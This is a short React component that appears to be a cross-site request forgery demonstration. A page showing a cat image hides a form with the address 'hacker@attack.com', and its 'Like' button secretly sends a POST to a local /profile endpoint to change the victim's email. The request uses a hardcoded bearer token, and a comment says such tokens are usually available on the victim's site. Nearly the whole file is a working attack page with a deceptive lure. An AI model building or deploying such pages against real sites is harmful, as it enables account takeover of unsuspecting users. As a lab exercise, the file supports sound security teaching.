import React from "react";
import axios from "axios";


function App() {

  const submit = async (e)=>{
    e.preventDefault();
    const form = document.getElementById("form");
    console.log("hello");
    console.log(form.elements["t1"].value);
    try{
      await axios.post("http://localhost:4000/profile",
      {email : form.elements["t1"].value},
      //this information is generally present in the victim's website. No need to put this manually
      {headers : {
          Authorization : "Bearer" + " " + "eyJhbGciOiJIUzI1NiJ9.NjIwZGM0M2VkNDQzOTI3Mzc2NDRhYzc2.ZOg_XNUa7Si1BjN_qRL72rsLJa1X_BV2YmxLsItzTCg"
      }}
      );
    }catch(err){
      console.log("error.....");
    }
  }

  return (
    <>
      <h2> Cute Cat Image </h2>
       <img src="https://images.unsplash.com/photo-1587996833651-06a23343b15d?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1169&q=80" alt="cat_image"/>
       <br/>
       {/* hidden form */}
       <form id="form">
           <input type="hidden" value="hacker@attack.com" id="t1"></input>
           <h6>If you loved the cat , Please Like</h6> <button type="submit" onClick={submit} id="mybtn">Like</button>
       </form>
    </>
  );
}

export default App;
